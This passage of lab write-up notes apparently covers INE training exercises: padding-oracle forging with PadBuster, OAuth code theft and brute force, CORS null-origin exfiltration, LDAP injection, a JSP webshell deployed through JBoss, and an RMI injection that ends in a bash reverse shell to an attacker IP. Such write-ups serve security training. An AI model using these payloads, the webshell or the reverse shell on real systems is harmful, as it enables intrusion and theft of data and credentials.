Padbuster was able to retrieve 2/3 of the whole plaintext message, but we are still missing the first 1/3. This is because the first part is encrypted using an IV which cannot be gathered by the padding oracle. Visiting the http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80 which tells us that the first part, which was not recovered, contains "ApplicationUsername". As such, the full translation:
```bash
6b664ef0359fe233e021ad36b12d8e32 -> ApplicationUsern
b8f1335522753d45174435c16b52dc2e -> ame=user&Passwor
5bbd4363b9d91d4c9100beae6ce34e80 -> d=sesame
```
Now, to retrieve the id, we run:
```bash
padbuster "http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32" "6b664ef0359fe233e021ad36b12d8e32" 16 -encoding 1 -error "ApplicationUsername missing" -prefix "6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e" -noiv
```
The reason for these arguments is the following:
- We use just the first block of the whole encrypted string - the one that was not decrypted
- Next, we specify 16 bytes as the block size and lowercase hex encoding
- -error tells the application what string to look for in the response page to treat it as the error (we could have identified that error message by requesting something like http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34eff and the response would indicate of the invalid padding)
- -noiv is used to get the intermediate value after decrypting the first block.

And we get the IV:
```bash
[+] Cipher Text (HEX): 6b664ef0359fe233e021ad36b12d8e32
[+] Intermediate Bytes (HEX): 221449095f050045505c5e671003460d
[+] Plain Text: "I      _EP\^gF
```
Now, time to retrieve the signing key.
To get the key, we need to XOR the hex representation of the ciphertext (Intermediate bytes - hex for "I _EP\^gF) with the hex representation of "ApplicationUsern", which is 0x4170706c69636174696f6e557365726e. We go to xor.pw and input:
```bash
Input 1: 4170706c69636174696f6e557365726e
Input 2: 221449095f050045505c5e671003460d
```
We get back 0x63643965366661313933303263663463, which translates to cd9e6fa19302cf4c in ASCII (coverted using https://www.rapidtables.com/convert/number/hex-to-ascii.html), which is the used signing key.
Now we can create arbitrary credential pairs.
To make the application receive "authorization" as the username and "bypass" as the password, we would provide similar arguments to PadBuster as before, like the ones set to obtain the encryption key. PadBuster's base will be the first block with the prefix and the same error indicator. The only addition is padding to the plaintext to close the "previous" argument when encrypting (we need data in the below format). Note that "=xyz" can be replaced with =anything& as we just want to "close" the first argument in the GET request. Otherwise, all the encrypted data would be understood by the application as the value of the previous parameter and would not be treated as username and password values:
```bash
padbuster "http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32" "6b664ef0359fe233e021ad36b12d8e32" 16 -encoding 1 -error "ApplicationUsername missing" -prefix "6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e" -plaintext "=xyz&ApplicationUsername=authorization&Password=bypass"
```
Once finished, we get:
```bash
[+] Encrypted value is: 5455c513e812a5bfbddfa75194573f07d4ddee7f0f8ec540644a5e38679f39ea17f4add5e45ec7f74119ade4bf6e2615ab0b799bb09f03bb7dc3260512cf1a7400000000000000000000000000000000
```
Sending that in this url: http://demo.ine.local/check?cipher=5455c513e812a5bfbddfa75194573f07d4ddee7f0f8ec540644a5e38679f39ea17f4add5e45ec7f74119ade4bf6e2615ab0b799bb09f03bb7dc3260512cf1a7400000000000000000000000000000000 we can confirm that we were able to correctly encrypt the credentials.
# Attacking OAuth
## Create a code stealing PoC
This attack simply revoles on the redirect uri not being validated, so if we can inject our redirect uri to a request a client makes, then we can get the OAuth token by receiving it on our server.
We know that the response type should be "code", the scope "view_gallery" and the client id "photoprint". We construct the following request:
```bash
http://gallery:3005/oauth/authorize?response_type=code&scope=view_gallery&client_id=photoprint
```
If we issue it, we see that the request goes to OAuth server but fails as we are missing the redirect parameter, therefore let's include it. If our IP is: 192.8.110.2, we can use:
```bash
http://gallery:3005/oauth/authorize?response_type=code&scope=view_gallery&client_id=photoprint&redirect_uri=http://192.8.110.2/oauth
```
This way we will get a callback on our server with the OAuth code:
```bash
root@INE:~ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.8.110.2 - - [25/Jan/2023 16:46:59] code 404, message File not found
192.8.110.2 - - [25/Jan/2023 16:46:59] "GET /oauth?code=63558 HTTP/1.1" 404 -
```
## Based on the acquired code, bruteforce the client_secret
So, now we have an authorization code which we stole and is valid. By constructing a request to issue an OAuth token (a POST to /oauth/token) containing the client_id and code that we know, we can bruteforce the client_secret.
We send the following request to intruder:
```bash
POST /oauth/token HTTP/1.1
Host: gallery:3005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://gallery:3005
Connection: close
Referer: http://gallery:3005/login
Cookie: connect.sid=s%3AyLmnwEXMSImfN_6B_4TIebntE3A_k789.TgIkQuM6qF5jujQ%2FxrUK3fMls8Oc%2Fk9nKCcJX5TRSJw
Upgrade-Insecure-Requests: 1

grant_type=authorization_code&client_id=photoprint&client_secret=§password§&code=63558&redirect_uri=http://gallery:3005/callback
```
With a wordlist to bre tried as an argument of the client_secret field. Once the bruteforce completes, we find "secret" as the client_secret. Now we are able to request as many access tokens as we want (check the response):
```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache
Date: Wed, 25 Jan 2023 11:36:40 GMT
Connection: close
Content-Length: 44

{"access_token":32246,"token_type":"Bearer"}
```
## Discover another token vulnerability
What's interesting in the above response, is that no token timeout is defined, hence some valid tokens might not expire and this is a behavior which we can take advantage from. We can therefore, knowing that the access_token is sent as a GET parameter and is composed of all numbers from 00000 to 99999 try to bruteforce it. We setup intruder as usual:
```bash
GET /photos/me?access_token=§32246§ HTTP/1.1
Host: gallery:3005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gallery:3005/login
Connection: close
Cookie: connect.sid=s%3AyLmnwEXMSImfN_6B_4TIebntE3A_k789.TgIkQuM6qF5jujQ%2FxrUK3fMls8Oc%2Fk9nKCcJX5TRSJw
Upgrade-Insecure-Requests: 1
```
And as payload: numbers, sequential, from 99999 to 00000 with -1 as step.
After a while we get valid access_tokens.
# Null Origin Exploitation (CORS)
In this case we are tasked to do a CORS abuse to steal the content of a secret page accessible only by admin.
Browsing to demo.ine.local we are greeted by a login page to which we can access using admin:admin. After logging in, we land to the "secret.php" page which contains a passcode in its source. We need to steal that passcode.
Checking the response to GET /secret.php, we see the two cors headers:
```bash
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
This tells us that the website trusts all sites with a null origin and that it can also send the credentials with all requests. Now, there are two ways to make null origins:
- using files on the disk
- using an iframe

Let's do the iframe as it will be slightly more realistic than a file. We host an iframe in a malicious page and wait for the victim to browse it. An example could be:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET','http://demo.ine.local/secret.php',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='http://192.64.78.2/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
Upon visiting, the iframe will throw a 404 not found, but we will receive the encoded webpage on our webserver:
```bash
%3C!DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%3Cmeta%20charset%3D%22utf-8%22%3E%0A%20%20%3Ctitle%3ESecret!%3C%2Ftitle%3E%0A%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%22%3E%0A%20%20%3Clink%20href%3D%22%2Fcss%2Ftailwind.min.css%22%20rel%3D%22stylesheet%22%3E%0A%3C%2Fhead%3E%0A%3Cbody%20class%3D%22h-screen%20overflow-hidden%20flex%20flex-col%20items-center%20justify-center%22%20style%3D%22background%3A%20%23edf2f7%3B%22%3E%0A%20%20%3Cdiv%20class%3D%22my-4%20text-2xl%22%3E%0A%20%20%20%20This%20is%20highly%20confidential%20passcode%3A%205478a44e68%0A%20%20%3C%2Fdiv%3E%0A%20%20%3Ca%20class%3D%22mt-8%20text-lg%22%20href%3D%22%2Flogout.php%22%3E%0A%20%20%20%20Log%20Out%0A%20%20%3C%2Fa%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A
```
Which decoded becomes:
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Secret!</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="/css/tailwind.min.css" rel="stylesheet">
</head>
<body class="h-screen overflow-hidden flex flex-col items-center justify-center" style="background: #edf2f7;">
  <div class="my-4 text-2xl">
    This is highly confidential passcode: 5478a44e68
  </div>
  <a class="mt-8 text-lg" href="/logout.php">
    Log Out
  </a>
</body>
</html>
```
# Attacking LDAP
Browsing at http://demo.ine.local:9090/ we are presented with the website. Looking at the stock control function, we see that we can retrieve fruits using this url: http://demo.ine.local:9090/fruit_or_veg?objectClass=fruits. It seems like we can control the objectClass parameter. 
Entering: 
```bash
http://demo.ine.local:9090/fruit_or_veg?objectClass=*))(&objectClass=void
```
We are able to retrieve the full list of objects, which includes also vegs and users and admins. The user david has "Administrator" in its description which is interesting for us. Looking at the objectClass posixAccount, we are able to extract the users which are also present on the system. We are told when browsing the application that the admins (David) store their SSH key in the database. So, by a google search of "ldap posixaccount ssh key", we get that the name we are looking for is 'sshPublicKey' and as such we can retrieve it with:
```bash
http://demo.ine.local:9090/item?cn=david&disp=sshPublicKey
```
And we get the creds: david:r0ck_s0l1d_p4ssw0rd. Now we can login via SSH and get the flag: 5520dd2d85e5003db92048c629bb5072.
As a bonus, we can also see that the objectClass url parameter is reflected and HTML injection is possible, for instance by injecting some underline tags such as <u></u>. We can get something more by using (parenthesis don't work):
```bash
<script>alert`document.domain`</script>
```
# HTML Adapter to root (JBOSS)
After an nmap scan we see multiple ports open, including Tomcat, RMI and JBoss.
Trying to access the JMX console on JBOSS, we are asked for credentials. The defaults admin:admin work and we are then in. The JMX console allows us to manage the application, potentially executing malicious code.
Going to jboss.system, we find the service "MainDeployer" which we can use, under the redeploy function to upload a malicious webshell.
We can use the following backdoor:
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```
We need a war file, so we archive it with:
```bash
jar -cvf backdoor.war backdoor.jsp
```
We then setup a webserver serving the war file and using the redeploy function we supply to url pointing to the war.
We can then access it:
```bash
http://demo.ine.local:8080/backdoor/backdoor.jsp?cmd=whoami
```
Which returns root.
# Insecure RMI
We go once again for a nmap scan and we find port 1099 (Java RMI) open. Java RMI allows an object running in a JVM to invoke methods on an object running in another JVM. When developers want to make their Java object available withing the network, they usually bind them to a RMI registry. This registry stores all information required for the connection and makes it available in a human readable name, much like a DNS service.
We start by dumping all info from the service:
```bash
nmap --script rmi-dumpregistry -p 1099 demo.ine.local
```
We find that the CustomRMIServer implements the java.rmi.Remote interface, we need to guess the methods that can be done with: https://github.com/qtc-de/remote-method-guesser.
We thus download the compiled version and run:
```bash
java -jar target/rmg-4.2.2-jar-with-dependencies.jar guess demo.ine.local 1099
```
With the "guess" parameter to guess for methods.
The guess worked and we are presented with the runCommand method which accepts a string. Note that not always we can retrieve the output if it's a command injection, so we go for a ping. We setup tcpdump on the interface listening for icmp, and we run the following:
```bash
java -jar rmg-4.2.2-jar-with-dependencies.jar call demo.ine.local 1099 --bound-name CustomRMIServer 'new String[] {"ping", "-c", "5", "192.240.206.2"}' --signature 'String runCommand(String[] args)'
```
We get pings on our machine so we are good to go.
In order to retrieve the output we can use the GenericPrint plugin as follows:
```bash
java -jar rmg-4.2.2-jar-with-dependencies.jar call demo.ine.local 1099 --bound-name CustomRMIServer 'new String[] {"whoami"}' --signature 'String runCommand(String[] args)' --plugin ../plugins/GenericPrint.jar
```
Which returns root!
Time to get a shell, we encode a bash shell as:
```bash
echo '/bin/bash -c "bash -i >& /dev/tcp/192.240.206.2/443 0>&1"' | base64 -w0;echo
```
Then we setup a listener and craft the exploit with:
```bash
java -jar rmg-4.2.2-jar-with-dependencies.jar call demo.ine.local 1099 --bound-name CustomRMIServer 'new String[] {"/bin/bash", "-c", "echo L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4yNDAuMjA2LjIvNDQzIDA+JjEiCg== | base64 -d | bash"}' --signature 'String runCommand(String[] args)'
```
We simply fire it to get back a shell.